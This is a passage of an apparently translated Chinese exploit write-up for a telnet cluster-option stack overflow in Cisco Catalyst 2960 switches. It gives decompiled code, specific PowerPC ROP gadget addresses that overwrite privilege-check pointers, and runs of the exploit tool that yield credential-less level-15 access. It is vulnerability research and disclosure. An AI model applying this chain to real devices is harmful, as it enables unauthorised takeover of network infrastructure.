这时候，IDA就该上场了。这里的CPU架构是PowerPC 32位BigEndian。下面，我们将这个二进制文件加载到0x3000处：
**寻找字符串**
还记得前面在群集通信中捕获的字符串CISCO_KITS吗？我们将从这里下手。在通过IDA观察大部分函数后，可以发现针对固件末尾处那些字符串的交叉引用。
“CISCO_KITS”字符串将被return_cisco_kits函数所引用，实际上该函数只是将该字符串作为char
*返回。我们将重点关注调用return_cisco_kits的call_cisco_kits函数，该函数位于0x0004ED8C。
因为telnet代码对于客户端和服务器而言是对称的，所以我们实际上可以看到发送到服务器端的缓冲区的格式为- ％c％s％c％d：％s：％d
:。这实际上与发送缓冲区中观察到的流量是一致的：
    if ( telnet_struct->is_client_mode ) // client mode? then send "CISCO_KITS" string
    {
        if ( telnet_struct->is_client_mode == 1 )
        {
          cisco_kits_string_2 = (char *)return_cisco_kits();
          int_two = return_2();
          tty_str = get_from_tty_struct((telnet_struct *)telnet_struct_arg->tty_struct);
          *(_DWORD *)&telnet_struct_arg->tty_struct[1].field_6D1;
          format1_ret = format_1(
                                   128,
                                   (int)&str_buf[8],
                                   "%c%s%c%d:%s:%d:",
                                   3,
                                   cisco_kits_string_2,
                                   1,
                                   int_two,
                                   tty_str,
                                   0);
          telnet_struct = (telnet_struct *)telnet_send_sb(
                                             (int)telnet_struct_arg,
                                             36,
                                             0,
                                             &str_buf[8],
                                             format1_ret,
                                             v8,
                                             v7,
                                             v6);
        }
    }
大家有没有发现，这里有两个％s字符串修饰符，但是在流量样本中实际上只有一个字符串即CISCO_KITS，这是因为第二个字符串是空的，并且位于两个:字符之间。进一步观察函数的控制流程，我注意到处理第二个字符串时（这次是服务器端代码）有一些有趣的行为：
    for ( j = (unsigned __int8)*string_buffer; j != ':'; j = (unsigned __int8)*string_buffer )// put data before second ":" at &str_buf + 152
    {
        str_buf[v19++ + 152] = j;
        ++string_buffer;
    }
我们发送取自第二个％s字符串中的数据的时候，实际上会一直复制到：字符，并且没有检查位于堆栈上的目标缓冲区的目标边界。这会出现什么情况？ 没错， 缓冲区溢出！
**让代码运行起来**
实际上，要想控制指令指针是很容易的，因为可以用发送的缓冲区来覆盖它。但问题是：堆和（位于堆上的）栈是不可执行的。我的最佳选择是，启用数据和指令缓存。以下内容引自Felix
Lindner在BlackHat 2009上的演示文稿：
该ROP上场了
由于没有办法在堆栈上执行代码，所以我不得不将其用作数据缓冲区并重用固件中的现有代码。这种做法的思想是，通过某种方式链接函数的Epilog来完成任意的内存写操作。但等一下，写什么呢？
我们先来看看反编译的0x00F47A34处的函数：
    if ( ptr_is_cluster_mode(tty_struct_var->telnet_struct_field) )
    {
      telnet_struct_var = tty_struct_var->telnet_struct_field;
      ptr_get_privilege_level = (int (__fastcall *)(int))some_libc_func(0, (unsigned int *)&dword_22659D4[101483]);
      privilege_level = ptr_get_privilege_level(telnet_struct_var);// equals to 1 during rcommand 1
      telnet_struct_1 = tty_struct_var->telnet_struct_field;
      ptr_telnet_related2 = (void (__fastcall *)(int))some_libc_func(1u, (unsigned int *)&dword_22659D4[101487]);
      ptr_telnet_related2(telnet_struct_1);
      *(_DWORD *)&tty_struct_var->privilege_level_field = ((privilege_level privilege_level_field & 0xFFFFFFF) & 0xFF7FFFFF;
    }
    else
    {
      //generic telnet session
    }
这里发生了一些有趣的事情。首先要强调的是，ptr_is_cluster_mode和ptr_get_privilege_level都是通过引用全局变量间接进行调用的。检查地址为0x00F47B60的代码行，我们发现is_cluster_mode函数的地址是从0x01F24A7处的dword中加载的。类似的，get_privilege_level函数的地址则是从0x3F47B8C处的r3寄存器中加载的。此时，r3的内容则是“残留”在地址0x022659D4
+ 0x28 + 0xC处的一个已经解除引用的指针。
如果ptr_is_cluster_mode调用返回非零值，并且ptr_get_privilege调用返回-1之外的值，那么我们将收到一个telnet
shell，并且不需要提供任何登陆凭证。下面的代码用来检查变量privilege_level的值：
如何才能覆盖这些函数指针，让它总是返回所需的正值的呢？
由于堆和栈无法直接执行，所以我不得不重用现有的代码来执行此类的内存写操作。为此，可以使用以下ROP零件：
    0x000037b4: 
        lwz r0, 0x14(r1)
        mtlr r0
        lwz r30, 8(r1)
        lwz r31, 0xc(r1)
        addi r1, r1, 0x10 
        blr
将is_cluster_mode函数指针加载到r30中，然后加载将该指针覆盖为r31的值。用于覆盖的值是一个始终返回1的函数的地址：
    0x00dffbe8: 
        stw r31, 0x34(r30)
        lwz r0, 0x14(r1)
        mtlr r0
        lmw r30, 8(r1)
        addi r1, r1, 0x10
        blr
完成实际的写操作。
    0x0006788c: 
        lwz r9, 8(r1)
        lwz r3, 0x2c(r9)
        lwz r0, 0x14(r1)
        mtlr r0
        addi r1, r1, 0x10
        blr
    0x006ba128: 
        lwz r31, 8(r1)
        lwz r30, 0xc(r1)
        addi r1, r1, 0x10
        lwz r0, 4(r1)
        mtlr r0
        blr
上面两个零件会把get_privilege_level函数的指针加载到r3中，同时加载一个将该其覆盖为r31的值。目标值是一个返回15的函数的地址：
    0x0148e560: 
        stw r31, 0(r3)
        lwz r0, 0x14(r1)
        mtlr r0
        lwz r31, 0xc(r1)
        addi r1, r1, 0x10
        blr
这个Epilog完成最终的写操作并返回到合法的执行流程。当然，应该对堆栈结构进行相应的格式化，以便使这个rop链可以正常工作。为了了解能够使该rop链按预期运行的实际堆栈布局，可以参考漏洞利用源码。
**运行漏洞利用代码**
忙活一天之后，我终于搞定了一个工具，可以用来给一些重要函数指针打补丁的工具，这些函数之所以重要，是因为它们是处理连接和权限的。请注意，漏洞利用代码严重依赖于交换机上所使用的固件版本。对某些不同的固件版本来说，这里的漏洞利用代码很可能会导致设备崩溃。
根据对较旧的固件SE1的静态和动态分析的了解，我们为最新的建议固件12.2（55）SE11构建了一个漏洞利用代码。固件版本之间的唯一区别，在于函数和指针偏移的不同。此外，该漏洞利用代码运行机制使得我们可以轻松地将更改还原。下面举例说明：
    $ python c2960-lanbasek9-m-12.2.55.se11.py 192.168.88.10 --set
    [+] Connection OK
    [+] Recieved bytes from telnet service: 'xffxfbx01xffxfbx03xffxfdx18xffxfdx1f'
    [+] Sending cluster option
    [+] Setting credless privilege 15 authentication
    [+] All done
    $ telnet 192.168.88.10
    Trying 192.168.88.10...
    Connected to 192.168.88.10.
    Escape character is '^]'.
    catalyst1#show priv
    Current privilege level is 15
    catalyst1#show ver
    Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 12.2(55)SE11, RELEASE SOFTWARE (fc3)
    ...
    System image file is "flash:c2960-lanbasek9-mz.122-55.SE11.bin"
    ...
    cisco WS-C2960-48TT-L (PowerPC405) processor (revision B0) with 65536K bytes of memory.
    ...
    Model number                    : WS-C2960-48TT-L
    ...
    Switch Ports Model              SW Version            SW Image                 
    ------ ----- -----              ----------            ----------               
    *    1 50    WS-C2960-48TT-L    12.2(55)SE11          C2960-LANBASEK9-M        
    Configuration register is 0xF
撤消更改:
    $ python c2960-lanbasek9-m-12.2.55.se11.py 192.168.88.10 --unset
    [+] Connection OK
    [+] Recieved bytes from telnet service: 'xffxfbx01xffxfbx03xffxfdx18xffxfdx1frncatalyst1#'
    [+] Sending cluster option
    [+] Unsetting credless privilege 15 authentication
    [+] All done
    $ telnet 192.168.88.10
    Escape character is '^]'.
    User Access Verification
    Password:
这个RCE漏洞的POC代码可用于两种固件版本。这个漏洞利用代码的DoS版本可作为metasploit模块使用，适用于Cisco报告中提到的大多数型号的交换机。